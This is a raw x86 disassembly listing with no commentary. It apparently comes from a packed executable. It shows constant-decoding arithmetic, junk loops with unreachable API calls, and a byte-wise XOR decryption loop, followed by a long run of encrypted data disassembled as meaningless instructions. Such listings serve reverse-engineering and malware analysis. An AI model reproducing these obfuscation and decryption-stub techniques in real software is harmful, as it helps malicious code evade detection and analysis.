  410adc:	mov    ebx,DWORD PTR ds:0x41d46c
  410ae2:	mov    ebx,DWORD PTR [ebx+0x198]
  410ae8:	xor    edx,esi
  410aea:	add    edx,edi
  410aec:	cmp    edx,DWORD PTR [ebx]
  410aee:	jne    0x410b09
  410af4:	push   ecx
  410af5:	mov    ecx,DWORD PTR [ebp-0x4]
  410af8:	xor    ecx,esi
  410afa:	add    ecx,edi
  410afc:	push   ecx
  410afd:	push   eax
  410afe:	push   DWORD PTR [ebp-0x8]
  410b01:	push   DWORD PTR [ebp-0x4]
  410b04:	call   0x40b7a6
  410b09:	push   DWORD PTR [ebp-0x8]
  410b0c:	push   DWORD PTR [ebp-0x4]
  410b0f:	call   0x410b98
  410b14:	mov    eax,DWORD PTR [ebp-0x4]
  410b17:	xor    eax,esi
  410b19:	add    eax,edi
  410b1b:	mov    ds:0x41d4f0,eax
  410b20:	mov    eax,DWORD PTR [ebp-0x4]
  410b23:	xor    eax,esi
  410b25:	add    eax,edi
  410b27:	mov    ds:0x41d4e8,eax
  410b2c:	lea    eax,[ebp-0x18]
  410b2f:	mov    DWORD PTR [ebp-0x34],eax
  410b32:	lea    eax,[ebp+0x4]
  410b35:	mov    DWORD PTR [ebp-0x18],eax
  410b38:	mov    eax,DWORD PTR [ebp-0x18]
  410b3b:	test   eax,eax
  410b3d:	je     0x410b76
  410b43:	mov    DWORD PTR [ebp-0x3c],0xf152c3d
  410b4a:	mov    DWORD PTR [ebp-0x40],0x712ed08
  410b51:	mov    DWORD PTR [ebp-0x44],0x373fc2e
  410b58:	mov    DWORD PTR [ebp-0x48],0x72670a1e
  410b5f:	call   0x40b3b6
  410b64:	mov    eax,DWORD PTR [ebp-0x10]
  410b67:	mov    eax,DWORD PTR [ebp-0x8]
  410b6a:	lea    eax,[ebp-0x34]
  410b6d:	push   eax
  410b6e:	push   DWORD PTR [ebp-0x4]
  410b71:	call   0x40b1b5
  410b76:	mov    eax,ds:0x41d46c
  410b7b:	push   0x4
  410b7d:	add    eax,0x1cc
  410b82:	push   eax
  410b83:	lea    eax,[ebp-0x10]
  410b86:	push   eax
  410b87:	call   0x403ce8
  410b8c:	mov    eax,DWORD PTR [ebp-0x10]
  410b8f:	mov    eax,DWORD PTR [eax]
  410b91:	pop    edi
  410b92:	pop    esi
  410b93:	pop    ebx
  410b94:	leave  
  410b95:	ret    0xc
  410b98:	push   ebp
  410b99:	mov    ebp,esp
  410b9b:	sub    esp,0x98
  410ba1:	mov    eax,DWORD PTR [ebp+0x8]
  410ba4:	mov    ecx,DWORD PTR ds:0x42601c
  410baa:	or     DWORD PTR ds:0x425008,ecx
  410bb0:	push   ebx
  410bb1:	push   esi
  410bb2:	and    ecx,esi
  410bb4:	push   edi
  410bb5:	inc    ecx
  410bb6:	mov    esi,0x7510893
  410bbb:	xor    eax,esi
  410bbd:	mov    edi,0x3272db
  410bc2:	add    eax,edi
  410bc4:	and    DWORD PTR ds:0x42800c,0x0
  410bce:	jmp    0x410be0
  410bd3:	mov    ecx,DWORD PTR ds:0x42800c
  410bd9:	inc    ecx
  410bda:	mov    DWORD PTR ds:0x42800c,ecx
  410be0:	cmp    DWORD PTR ds:0x42800c,0x18
  410be7:	jae    0x410c21
  410bed:	cmp    DWORD PTR ds:0x42800c,0x1f
  410bf4:	jne    0x410c1c
  410bfa:	push   0x41ff4d
  410bff:	push   0x7ac7
  410c04:	push   0x1b99
  410c09:	push   0x1d9a
  410c0e:	push   DWORD PTR [ebp-0x10]
  410c11:	push   0x26f8
  410c16:	call   DWORD PTR ds:0x42104c
  410c1c:	jmp    0x410bd3
  410c21:	mov    DWORD PTR [ebp-0x30],eax
  410c24:	sub    eax,eax
  410c26:	mov    eax,ds:0x41d2ec
  410c2b:	sbb    DWORD PTR ds:0x42801c,edi
  410c31:	mov    eax,DWORD PTR [eax]
  410c33:	mov    DWORD PTR [ebp-0x20],eax
  410c36:	and    DWORD PTR ds:0x426004,0x0
  410c40:	mov    ecx,DWORD PTR ds:0x426004
  410c46:	inc    ecx
  410c47:	mov    DWORD PTR ds:0x426004,ecx
  410c4d:	cmp    DWORD PTR ds:0x426004,0x21
  410c54:	jne    0x410c65
  410c5a:	push   0x2993
  410c5f:	call   DWORD PTR ds:0x421014
  410c65:	cmp    DWORD PTR ds:0x426004,0x1d
  410c6c:	jb     0x410c40
  410c72:	mov    DWORD PTR ds:0x425024,0x1a
  410c7c:	cmp    DWORD PTR ds:0x425024,0x0
  410c83:	je     0x410ccd
  410c89:	cmp    DWORD PTR ds:0x425024,0x8
  410c90:	jne    0x410ca1
  410c96:	push   0x8b04
  410c9b:	call   DWORD PTR ds:0x421018
  410ca1:	cmp    DWORD PTR ds:0x425024,0x9
  410ca8:	jne    0x410cbb
  410cae:	mov    ecx,DWORD PTR ds:0x425024
  410cb4:	dec    ecx
  410cb5:	mov    DWORD PTR ds:0x425024,ecx
  410cbb:	mov    ecx,DWORD PTR ds:0x425024
  410cc1:	dec    ecx
  410cc2:	mov    DWORD PTR ds:0x425024,ecx
  410cc8:	jmp    0x410c7c
  410ccd:	mov    eax,ds:0x41d4f4
  410cd2:	inc    ecx
  410cd3:	mov    eax,DWORD PTR [eax]
  410cd5:	mov    DWORD PTR [ebp-0x28],eax
  410cd8:	mov    DWORD PTR [ebp-0x38],0xf89c87b6
  410cdf:	sbb    DWORD PTR ds:0x42601c,0xf37
  410ce9:	mov    eax,DWORD PTR [ebp-0x38]
  410cec:	and    DWORD PTR ds:0x42900c,0x0
  410cf6:	mov    ecx,DWORD PTR ds:0x42900c
  410cfc:	inc    ecx
  410cfd:	mov    DWORD PTR ds:0x42900c,ecx
  410d03:	cmp    DWORD PTR ds:0x42900c,0x6
  410d0a:	jne    0x410d24
  410d10:	push   0x133c
  410d15:	push   DWORD PTR [ebp-0x14]
  410d18:	push   DWORD PTR [ebp-0x24]
  410d1b:	push   DWORD PTR [ebp-0x18]
  410d1e:	call   DWORD PTR ds:0x42101c
  410d24:	cmp    DWORD PTR ds:0x42900c,0x5
  410d2b:	jne    0x410d40
  410d31:	xor    ecx,ecx
  410d33:	xor    ecx,DWORD PTR ds:0x42900c
  410d39:	inc    ecx
  410d3a:	mov    DWORD PTR ds:0x42900c,ecx
  410d40:	cmp    DWORD PTR ds:0x42900c,0x1b
  410d47:	jb     0x410cf6
  410d4d:	xor    eax,esi
  410d4f:	and    DWORD PTR ds:0x429010,0x2e08
  410d59:	add    eax,edi
  410d5b:	mov    DWORD PTR [ebp-0x30],eax
  410d5e:	sbb    eax,eax
  410d60:	mov    eax,ds:0x41d46c
  410d65:	sbb    DWORD PTR ds:0x428018,0x460c
  410d6f:	mov    DWORD PTR [ebp-0x30],eax
  410d72:	add    eax,0xded
  410d77:	mov    eax,DWORD PTR [ebp-0x20]
  410d7a:	mov    DWORD PTR [ebp-0x14],eax
  410d7d:	sbb    DWORD PTR ds:0x42501c,0x3470
  410d87:	mov    eax,DWORD PTR [ebp-0x14]
  410d8a:	and    DWORD PTR ds:0x428018,0x0
  410d94:	jmp    0x410da6
  410d99:	mov    ecx,DWORD PTR ds:0x428018
  410d9f:	inc    ecx
  410da0:	mov    DWORD PTR ds:0x428018,ecx
  410da6:	cmp    DWORD PTR ds:0x428018,0x15
  410dad:	jae    0x410df5
  410db3:	cmp    DWORD PTR ds:0x428018,0x6
  410dba:	jne    0x410dd0
  410dc0:	push   0x41ffaf
  410dc5:	push   0x41ff91
  410dca:	call   DWORD PTR ds:0x421050
  410dd0:	cmp    DWORD PTR ds:0x428018,0x5
  410dd7:	jne    0x410dea
  410ddd:	mov    ecx,DWORD PTR ds:0x428018
  410de3:	inc    ecx
  410de4:	mov    DWORD PTR ds:0x428018,ecx
  410dea:	jmp    0x410d99
  410def:	and    DWORD PTR ds:0x426000,ecx
  410df5:	push   0x4
  410df7:	pop    ecx
  410df8:	sub    ecx,eax
  410dfa:	add    ecx,DWORD PTR [ebp-0x28]
  410dfd:	mov    DWORD PTR [ebp-0x2c],0xf89c85f6
  410e04:	mov    DWORD PTR [ebp-0x24],ecx
  410e07:	mov    DWORD PTR [ebp-0x98],0xf89c85ba
  410e11:	or     DWORD PTR ds:0x427000,edx
  410e17:	mov    eax,DWORD PTR [ebp-0x14]
  410e1a:	xor    DWORD PTR ds:0x429010,0x390a
  410e24:	mov    DWORD PTR [ebp-0x94],eax
  410e2a:	sbb    DWORD PTR ds:0x425020,0x44b0
  410e34:	mov    eax,DWORD PTR [ebp-0x24]
  410e37:	mov    DWORD PTR [ebp-0x90],eax
  410e3d:	mov    DWORD PTR ds:0x429010,0x17
  410e47:	cmp    DWORD PTR ds:0x429010,0x0
  410e4e:	je     0x410ede
  410e54:	cmp    DWORD PTR ds:0x429010,0x5
  410e5b:	jne    0x410e6f
  410e61:	push   DWORD PTR [ebp-0x24]
  410e64:	push   0x823f
  410e69:	call   DWORD PTR ds:0x421054
  410e6f:	cmp    DWORD PTR ds:0x429010,0x6
  410e76:	jne    0x410e87
  410e7c:	mov    eax,ds:0x429010
  410e81:	dec    eax
  410e82:	mov    ds:0x429010,eax
  410e87:	mov    eax,ds:0x429010
  410e8c:	dec    eax
  410e8d:	mov    ds:0x429010,eax
  410e92:	jmp    0x410e47
  410e97:	and    DWORD PTR ds:0x429004,0x0
  410ea1:	jmp    0x410eb1
  410ea6:	mov    eax,ds:0x429004
  410eab:	inc    eax
  410eac:	mov    ds:0x429004,eax
  410eb1:	cmp    DWORD PTR ds:0x429004,0x18
  410eb8:	jae    0x410ede
  410ebe:	cmp    DWORD PTR ds:0x429004,0x26
  410ec5:	jne    0x410ed9
  410ecb:	push   0x42801c
  410ed0:	push   DWORD PTR [ebp-0x18]
  410ed3:	call   DWORD PTR ds:0x421058
  410ed9:	jmp    0x410ea6
  410ede:	mov    eax,DWORD PTR [ebp-0x2c]
  410ee1:	or     DWORD PTR ds:0x429014,0x2e7c
  410eeb:	xor    eax,esi
  410eed:	add    eax,edi
  410eef:	mov    DWORD PTR [ebp-0x8c],eax
  410ef5:	lea    eax,[ebp-0x50]
  410ef8:	mov    DWORD PTR [ebp-0x88],eax
  410efe:	xor    DWORD PTR ds:0x425000,0x42600c
  410f08:	mov    eax,DWORD PTR [ebp-0x98]
  410f0e:	xor    DWORD PTR ds:0x42900c,0x426014
  410f18:	xor    eax,esi
  410f1a:	add    eax,edi
  410f1c:	adc    DWORD PTR ds:0x426008,0x425014
  410f26:	mov    DWORD PTR [ebp-0x98],eax
  410f2c:	lea    eax,[ebp-0x98]
  410f32:	adc    DWORD PTR ds:0x427018,0x426018
  410f3c:	push   eax
  410f3d:	adc    DWORD PTR ds:0x426004,0x2a7
  410f47:	mov    eax,DWORD PTR [ebp+0xc]
  410f4a:	sub    DWORD PTR ds:0x429010,0x42501c
  410f54:	xor    eax,esi
  410f56:	add    DWORD PTR ds:0x425020,0x427018
  410f60:	add    eax,edi
  410f62:	xor    DWORD PTR ds:0x42501c,0x425000
  410f6c:	push   eax
  410f6d:	mov    DWORD PTR ds:0x429010,0x1047
  410f77:	mov    eax,ds:0x41d48c
  410f7c:	and    DWORD PTR ds:0x425018,0x428010
  410f86:	push   0x41d3e2
  410f8b:	push   DWORD PTR [eax]
  410f8d:	call   0x403f26
  410f92:	sub    eax,DWORD PTR ds:0x427000
  410f98:	mov    eax,DWORD PTR [ebp-0x14]
  410f9b:	adc    ecx,DWORD PTR ds:0x425008
  410fa1:	mov    ecx,DWORD PTR [ebp-0x24]
  410fa4:	xor    DWORD PTR ds:0x429010,0x42900c
  410fae:	mov    DWORD PTR [ebp-0x4c],ecx
  410fb1:	mov    ecx,DWORD PTR [ebp+0x8]
  410fb4:	adc    DWORD PTR ds:0x425010,0x425014
  410fbe:	xor    ecx,esi
  410fc0:	add    DWORD PTR ds:0x428018,0x42900c
  410fca:	mov    DWORD PTR [ebp-0x38],eax
  410fcd:	add    ecx,edi
  410fcf:	mov    DWORD PTR ds:0x427000,0x74a5
  410fd9:	jmp    0x41374e
  410fde:	and    DWORD PTR ds:0x426008,0x0
  410fe8:	mov    ebx,DWORD PTR ds:0x426008
  410fee:	inc    ebx
  410fef:	mov    DWORD PTR ds:0x426008,ebx
  410ff5:	cmp    DWORD PTR ds:0x426008,0x15
  410ffc:	jne    0x411017
  411002:	push   0x42900c
  411007:	push   0x429010
  41100c:	push   0x5fed
  411011:	call   DWORD PTR ds:0x42105c
  411017:	cmp    DWORD PTR ds:0x426008,0x12
  41101e:	jb     0x410fe8
  411024:	and    DWORD PTR ds:0x426004,0x0
  41102e:	xor    ebx,ebx
  411030:	add    ebx,DWORD PTR ds:0x426004
  411036:	inc    ebx
  411037:	mov    DWORD PTR ds:0x426004,ebx
  41103d:	cmp    DWORD PTR ds:0x426004,0x20
  411044:	jne    0x41105d
  41104a:	push   DWORD PTR [ebp-0x20]
  41104d:	push   0x6608
  411052:	push   0x1aeb
  411057:	call   DWORD PTR ds:0x421020
  41105d:	cmp    DWORD PTR ds:0x426004,0x10
  411064:	jb     0x41102e
  41106a:	adc    DWORD PTR ds:0x427018,ecx
  411070:	lea    edx,[ecx+eax*1]
  411073:	sbb    DWORD PTR ds:0x428018,0x5978
  41107d:	mov    DWORD PTR [ebp-0x28],edx
  411080:	mov    edx,DWORD PTR ds:0x41d288
  411086:	mov    ebx,DWORD PTR ds:0x41d28c
  41108c:	sub    ebx,edx
  41108e:	sub    edx,DWORD PTR [edx+ebx*1]
  411091:	mov    edx,DWORD PTR [ebp-0x4c]
  411094:	and    DWORD PTR ds:0x426018,0x0
  41109e:	jmp    0x4110b0
  4110a3:	mov    ebx,DWORD PTR ds:0x426018
  4110a9:	inc    ebx
  4110aa:	mov    DWORD PTR ds:0x426018,ebx
  4110b0:	cmp    DWORD PTR ds:0x426018,0x16
  4110b7:	jae    0x4110e2
  4110bd:	cmp    DWORD PTR ds:0x426018,0x18
  4110c4:	jne    0x4110dd
  4110ca:	push   0x4880
  4110cf:	push   DWORD PTR [ebp-0x1c]
  4110d2:	push   0x14f0
  4110d7:	call   DWORD PTR ds:0x421028
  4110dd:	jmp    0x4110a3
  4110e2:	sub    edx,ecx
  4110e4:	xor    ebx,DWORD PTR ds:0x429004
  4110ea:	mov    DWORD PTR [ebp-0x20],edx
  4110ed:	and    DWORD PTR ds:0x427004,0x0
  4110f7:	mov    ebx,DWORD PTR ds:0x427004
  4110fd:	inc    ebx
  4110fe:	mov    DWORD PTR ds:0x427004,ebx
  411104:	cmp    DWORD PTR ds:0x427004,0x7
  41110b:	jne    0x41111c
  411111:	push   0x41feee
  411116:	call   DWORD PTR ds:0x42102c
  41111c:	cmp    DWORD PTR ds:0x427004,0x6
  411123:	jne    0x411136
  411129:	mov    ebx,DWORD PTR ds:0x427004
  41112f:	inc    ebx
  411130:	mov    DWORD PTR ds:0x427004,ebx
  411136:	cmp    DWORD PTR ds:0x427004,0x16
  41113d:	jb     0x4110f7
  411143:	movzx  edx,WORD PTR ds:0x428014
  41114a:	sbb    DWORD PTR ds:0x425000,edx
  411150:	mov    edx,DWORD PTR [ebp-0x20]
  411153:	or     ebx,0x6caa
  411159:	mov    DWORD PTR [ebp-0x14],edx
  41115c:	mov    edx,DWORD PTR [ebp-0x28]
  41115f:	mov    DWORD PTR [ebp-0x34],0xf89c85b6
  411166:	mov    DWORD PTR [ebp-0x44],edx
  411169:	mov    DWORD PTR [ebp-0x18],0xf89c85b5
  411170:	mov    edx,DWORD PTR [ebp-0x34]
  411173:	xor    edx,esi
  411175:	add    edx,edi
  411177:	mov    DWORD PTR [ebp-0x10],edx
  41117a:	mov    edx,DWORD PTR [ebp-0x34]
  41117d:	xor    edx,esi
  41117f:	add    edx,edi
  411181:	mov    DWORD PTR [ebp-0x8],edx
  411184:	mov    DWORD PTR [ebp-0x28],0xf89c85d6
  41118b:	mov    DWORD PTR [ebp-0x2c],0xf89c85bf
  411192:	mov    edx,DWORD PTR [ebp-0x34]
  411195:	mov    ebx,DWORD PTR [ebp-0x14]
  411198:	xor    edx,esi
  41119a:	add    edx,edi
  41119c:	cmp    ebx,edx
  41119e:	je     0x413742
  4111a4:	mov    eax,DWORD PTR [ebp-0x18]
  4111a7:	xor    eax,esi
  4111a9:	mov    edx,0xffcd8d25
  4111ae:	sub    edx,eax
  4111b0:	add    edx,DWORD PTR [ebp-0x14]
  4111b3:	mov    eax,DWORD PTR [ebp-0x18]
  4111b6:	mov    ebx,DWORD PTR [ebp-0x10]
  4111b9:	xor    eax,esi
  4111bb:	add    eax,edi
  4111bd:	imul   eax,ebx
  4111c0:	cmp    eax,edx
  4111c2:	ja     0x41373f
  4111c8:	mov    edx,DWORD PTR [ebp-0x10]
  4111cb:	mov    eax,DWORD PTR [ebp-0x14]
  4111ce:	mov    ebx,DWORD PTR [ebp-0x28]
  4111d1:	sub    eax,edx
  4111d3:	xor    ebx,esi
  4111d5:	xor    edx,edx
  4111d7:	add    ebx,edi
  4111d9:	div    ebx
  4111db:	mov    DWORD PTR [ebp-0x8],eax
  4111de:	mov    eax,DWORD PTR [ebp-0x2c]
  4111e1:	mov    edx,DWORD PTR [ebp-0x8]
  4111e4:	xor    eax,esi
  4111e6:	add    eax,edi
  4111e8:	cmp    edx,eax
  4111ea:	jbe    0x4111fa
  4111f0:	mov    eax,DWORD PTR [ebp-0x2c]
  4111f3:	xor    eax,esi
  4111f5:	add    eax,edi
  4111f7:	mov    DWORD PTR [ebp-0x8],eax
  4111fa:	mov    eax,DWORD PTR [ebp-0x28]
  4111fd:	mov    edx,DWORD PTR [ebp-0x8]
  411200:	xor    eax,esi
  411202:	add    eax,edi
  411204:	imul   eax,edx
  411207:	mov    DWORD PTR [ebp-0x8],eax
  41120a:	mov    eax,DWORD PTR [ebp-0x34]
  41120d:	mov    edx,DWORD PTR [ebp-0x8]
  411210:	xor    eax,esi
  411212:	add    eax,edi
  411214:	cmp    edx,eax
  411216:	je     0x413728
  41121c:	mov    eax,DWORD PTR [ebp-0x8]
  41121f:	mov    DWORD PTR [ebp-0x24],eax
  411222:	mov    eax,DWORD PTR [ebp-0x10]
  411225:	add    eax,DWORD PTR [ebp-0x44]
  411228:	mov    DWORD PTR [ebp-0x20],0xf89c85b6
  41122f:	mov    DWORD PTR [ebp-0x8],eax
  411232:	mov    eax,0xf89c85b5
  411237:	mov    DWORD PTR [ebp-0x3c],eax
  41123a:	mov    DWORD PTR [ebp-0x40],0xf89c85b4
  411241:	mov    DWORD PTR [ebp-0x30],0xf89c85bb
  411248:	mov    DWORD PTR [ebp-0x1c],eax
  41124b:	mov    eax,DWORD PTR [ebp-0x20]
  41124e:	xor    eax,esi
  411250:	add    eax,edi
  411252:	jmp    0x4136e4
  411257:	mov    DWORD PTR [ebp-0x48],0xf89c85bd
  41125e:	mov    eax,DWORD PTR [ebp-0x1c]
  411261:	mov    edx,DWORD PTR [ebp-0xc]
  411264:	xor    eax,esi
  411266:	add    eax,edi
  411268:	imul   eax,edx
  41126b:	mov    edx,DWORD PTR [ebp-0x8]
  41126e:	mov    al,BYTE PTR [eax+edx*1]
  411271:	mov    BYTE PTR [ebp-0x1],al
  411274:	mov    eax,DWORD PTR [ebp-0x1c]
  411277:	mov    edx,DWORD PTR [ebp-0xc]
  41127a:	xor    eax,esi
  41127c:	add    eax,edi
  41127e:	imul   eax,edx
  411281:	mov    edx,DWORD PTR [ebp-0x40]
  411284:	xor    edx,esi
  411286:	add    eax,edx
  411288:	mov    edx,DWORD PTR [ebp-0x8]
  41128b:	movzx  eax,BYTE PTR [eax+edx*1+0x3272db]
  411293:	mov    edx,DWORD PTR [ebp-0x48]
  411296:	xor    edx,esi
  411298:	lea    eax,[edx+eax*1+0x3272db]
  41129f:	movzx  edx,BYTE PTR [ebp-0x1]
  4112a3:	xor    edx,eax
  4112a5:	mov    BYTE PTR [ebp-0x1],dl
  4112a8:	mov    al,BYTE PTR [ebp-0x1]
  4112ab:	mov    edx,DWORD PTR [ebp-0x1c]
  4112ae:	mov    ebx,DWORD PTR [ebp-0xc]
  4112b1:	xor    edx,esi
  4112b3:	add    edx,edi
  4112b5:	imul   edx,ebx
  4112b8:	mov    ebx,DWORD PTR [ebp-0x8]
  4112bb:	mov    BYTE PTR [edx+ebx*1],al
  4112be:	mov    eax,DWORD PTR [ebp-0x1c]
  4112c1:	mov    edx,DWORD PTR [ebp-0xc]
  4112c4:	xor    eax,esi
  4112c6:	add    eax,edi
  4112c8:	imul   eax,edx
  4112cb:	mov    edx,DWORD PTR [ebp-0x8]
  4112ce:	mov    al,BYTE PTR [eax+edx*1]
  4112d1:	mov    BYTE PTR [ebp-0x1],al
  4112d4:	mov    eax,DWORD PTR [ebp-0x1c]
  4112d7:	mov    edx,DWORD PTR [ebp-0xc]
  4112da:	xor    eax,esi
  4112dc:	add    eax,edi
  4112de:	imul   eax,edx
  4112e1:	mov    edx,DWORD PTR [ebp-0x3c]
  4112e4:	xor    edx,esi
  4112e6:	add    eax,edx
  4112e8:	mov    edx,DWORD PTR [ebp-0x8]
  4112eb:	movzx  eax,BYTE PTR [eax+edx*1+0x3272db]
  4112f3:	mov    edx,DWORD PTR [ebp-0x54]
  4112f6:	xor    edx,esi
  4112f8:	lea    eax,[edx+eax*1+0x3272db]
  4112ff:	movzx  edx,BYTE PTR [ebp-0x1]
  411303:	xor    edx,eax
  411305:	mov    BYTE PTR [ebp-0x1],dl
  411308:	mov    al,BYTE PTR [ebp-0x1]
  41130b:	mov    edx,DWORD PTR [ebp-0x1c]
  41130e:	jmp    0x4136c0
  411313:	cli    
  411314:	jl     0x411300
  411316:	popa   
  411317:	fs jecxz 0x411383
  41131a:	repz push eax
  41131c:	push   esp
  41131d:	and    eax,0xc68a17d3
  411322:	jbe    0x41137b
  411324:	mov    fs,WORD PTR [edx+0x62]
  411327:	int    0x5f
  411329:	bound  esp,QWORD PTR [edx+0x74]
  41132c:	out    dx,eax
  41132d:	sub    cl,bh
  41132f:	out    0x32,al
  411331:	int3   
  411332:	jnp    0x41138e
  411334:	jnp    0x411398
  411336:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411337:	iret   
  411338:	mov    ds:0xbf5b953f,al
  41133d:	div    DWORD PTR [edi-0x28114330]
  411343:	add    al,0x12
  411345:	outs   dx,DWORD PTR ds:[esi]
  411346:	and    esi,DWORD PTR [eax]
  411348:	sub    eax,esp
  41134a:	vpsadbw xmm0,xmm5,XMMWORD PTR [edx-0xc6e02eb]
  411352:	sti    
  411353:	jns    0x411319
  411355:	mov    esp,0x6c047122
  41135a:	(bad)  
  41135b:	push   ebx
  41135c:	mov    dl,0xc2
  41135e:	adc    BYTE PTR [ecx],cl
  411360:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411361:	sbb    DWORD PTR [edi+edx*1-0x4a],esp
  411365:	mov    dh,0x7f
  411367:	dec    ebx
  411368:	pop    edi
  411369:	les    ecx,FWORD PTR [edi+edx*8]
  41136c:	pop    eax
  41136d:	hlt    
  41136e:	adc    al,BYTE PTR [edx]
  411370:	mov    ds:0xeefec36a,al
  411375:	stos   DWORD PTR es:[edi],eax
  411376:	jae    0x41139a
  411378:	in     eax,dx
  411379:	and    edi,DWORD PTR [ebx-0x24]
  41137c:	scas   al,BYTE PTR es:[edi]
  41137d:	cmp    eax,0xf666ee07
  411382:	sti    
  411383:	scas   ax,WORD PTR es:[edi]
  411385:	inc    edi
  411386:	mov    dh,0x51
  411388:	mov    cl,0x6f
  41138a:	fdiv   QWORD PTR [ecx+edx*8+0x40]
  41138e:	add    DWORD PTR [eax+0x611625c0],esp
  411394:	ja     0x411320
  411396:	jmp    DWORD PTR [edi]
  411398:	ret    
  411399:	or     DWORD PTR [esi+0x45313776],ebx
  41139f:	xchg   ecx,eax
  4113a0:	inc    edi
  4113a1:	push   edi
  4113a2:	dec    esp
  4113a3:	adc    DWORD PTR [ecx],ecx
  4113a5:	jne    0x4113cb
  4113a7:	shr    ah,cl
  4113a9:	adc    al,0x43
  4113ab:	ins    BYTE PTR es:[edi],dx
  4113ac:	enter  0x63b1,0x67
  4113b0:	(bad)  [ecx]
  4113b2:	enter  0x6c37,0xa1
  4113b6:	scas   eax,DWORD PTR es:[edi]
  4113b7:	int    0x2f
  4113b9:	xor    ecx,ebx
  4113bb:	sar    dh,1
  4113bd:	ror    esp,cl
  4113bf:	frstor [eax+0x4ccc5276]
  4113c5:	dec    edx
  4113c6:	mov    bh,0xdd
  4113c8:	sbb    BYTE PTR [eax+0xc],0xc1
  4113cc:	mov    ds:0x9c73aa60,al
  4113d1:	or     al,0xba
  4113d3:	jmp    0x416038ce
  4113d8:	mov    al,ds:0x8aea22e1
  4113dd:	push   ebx
  4113de:	cwde   
  4113df:	and    ah,BYTE PTR [eax+0x4a06c353]
  4113e5:	xor    al,BYTE PTR [eax]
  4113e7:	pop    edx
  4113e8:	jae    0x411411
  4113ea:	enter  0xec69,0x82
  4113ee:	mov    ebx,0x5dba0929
  4113f3:	pop    ecx
  4113f4:	dec    esp
  4113f5:	rcl    esp,0x4c
  4113f8:	(bad)  
  4113f9:	fnclex 
  4113fb:	push   edx
  4113fc:	mov    ah,0x6a
  4113fe:	(bad)  
  4113ff:	jmp    0x9ec3:0x99947078
  411406:	imul   esi,DWORD PTR [ebx-0x66efca7f],0xffffffbf
  41140d:	or     edx,0xfffffff0
  411410:	sbb    esi,DWORD PTR [ebp-0x6e]
  411413:	xlat   BYTE PTR ds:[ebx]
  411414:	mov    dh,0xdc
  411416:	cld    
  411417:	test   DWORD PTR [ebp+0xa],ecx
  41141a:	or     ch,ch
  41141c:	sub    BYTE PTR ds:0x9b5e13ce,al
  411422:	and    esi,DWORD PTR [edx]
  411424:	ins    BYTE PTR es:[edi],dx
  411425:	jle    0x4113b5
  411427:	shl    BYTE PTR [eax+0x7e],cl
  41142a:	mov    bl,bl
  41142c:	pop    ecx
  41142d:	lea    esp,[ebp-0x5abd26ea]
  411433:	dec    ecx
  411434:	pushf  
  411435:	add    dh,ah
  411437:	add    eax,0xefca7f14
  41143c:	popa   
  41143d:	mov    edx,es
  41143f:	sbb    ah,0xb9
  411442:	sub    eax,0xcda4a76
  411447:	dec    ebx
  411448:	mov    esp,0xcf94dd2
  41144d:	outs   dx,DWORD PTR ds:[esi]
  41144e:	leave  
  41144f:	and    bh,BYTE PTR [esi+0x7294cc2a]
  411455:	popa   
  411456:	inc    eax
  411457:	retf   0x6f79
  41145a:	lods   al,BYTE PTR ds:[esi]
  41145b:	popa   
  41145c:	pop    ebp
  41145d:	mov    ds:0xea348e9e,eax
  411462:	popa   
  411463:	jmp    0x4114c9
  411465:	sbb    edi,0x7f
  411468:	popa   
  411469:	and    ebp,DWORD PTR [edi-0x4aef91ab]
  41146f:	cwde   
  411470:	pop    es
  411471:	int    0x1d
  411473:	inc    ecx
  411474:	ins    BYTE PTR es:[edi],dx
  411475:	adc    cl,BYTE PTR [edx+0x41c24785]
  41147b:	cdq    
  41147c:	xchg   esi,eax
  41147d:	pop    ss
  41147e:	xchg   ebp,eax
  41147f:	lods   al,BYTE PTR ds:[esi]
  411480:	sbb    eax,0xd729207b
  411485:	repnz hlt 
  411487:	loop   0x41147f
  411489:	adc    esi,ebp
  41148b:	pop    esp
  41148c:	cmc    
  41148d:	mov    dh,BYTE PTR [ecx-0x639a419f]
  411493:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411494:	cmp    DWORD PTR [edx],ecx
  411496:	out    0xf2,eax
  411498:	mov    WORD PTR [eax-0x673c6a92],es
  41149e:	in     eax,dx
  41149f:	jmp    0xf55fac11
  4114a4:	mov    ah,ch
  4114a6:	sbb    DWORD PTR [eax+0x7165a352],esp
  4114ac:	(bad)
  4114b0:	in     eax,0x74
  4114b2:	(bad)  
  4114b3:	jmp    0xa800:0x1bf3b04d
  4114ba:	dec    di
  4114bc:	mov    ds:0xb9de78b1,al
  4114c1:	push   ecx
  4114c2:	repz pop ss
  4114c4:	out    0x7e,eax
  4114c6:	loopne 0x411506
  4114c8:	inc    ebx
  4114c9:	mov    al,ds:0x25f60b7f
  4114ce:	cmp    ecx,esi
  4114d0:	das    
  4114d1:	(bad)  
  4114d2:	mov    WORD PTR [edi+0x69],fs
  4114d5:	xchg   esi,eax
  4114d6:	sti    
  4114d7:	jmp    0xebdf13e9
  4114dc:	shr    DWORD PTR [ecx],cl
  4114de:	pop    ecx
  4114df:	push   DWORD PTR [ebp-0x727312a6]
  4114e5:	pop    ebp
  4114e6:	xor    DWORD PTR [ecx],edi
  4114e8:	pop    esp
  4114e9:	xchg   ecx,eax
  4114ea:	nop
  4114eb:	mov    ?,WORD PTR [edx-0x3e57f890]
  4114f1:	lahf   
  4114f2:	loope  0x41153a
  4114f4:	pop    esp
  4114f5:	mov    ebx,DWORD PTR [ebx+0x10257f1d]
  4114fb:	bound  ecx,QWORD PTR [ebx]
  4114fd:	and    dl,BYTE PTR [edx+0x38a6cbcd]
  411503:	mov    ebx,0xe4536743
  411508:	mov    dh,0x28
  41150a:	jb     0x411515
  41150c:	mov    ah,0x78
  41150e:	dec    ebx
  41150f:	mov    al,0xc1
  411511:	clc    
  411512:	(bad)  
  411513:	jne    0x411517
  411515:	aam    0x8f
  411517:	add    dh,BYTE PTR [esi+edx*4]
  41151a:	push   ss
  41151b:	cmp    DWORD PTR [eax-0x549b10a2],edi
  411521:	push   ss
  411522:	and    DWORD PTR [eax+ebx*4+0xe],eax
  411526:	pusha  
  411527:	fwait
  411528:	adc    BYTE PTR [eax],0x50
  41152b:	lahf   
  41152c:	cmp    al,0x6c
  41152e:	sti    
  41152f:	mov    ds:0x574162a7,al
  411534:	int    0x1c
  411536:	je     0x411571
  411538:	mov    ebx,0xc03fbc21
  41153d:	dec    eax
  41153e:	dec    ebp
  41153f:	adc    ecx,eax
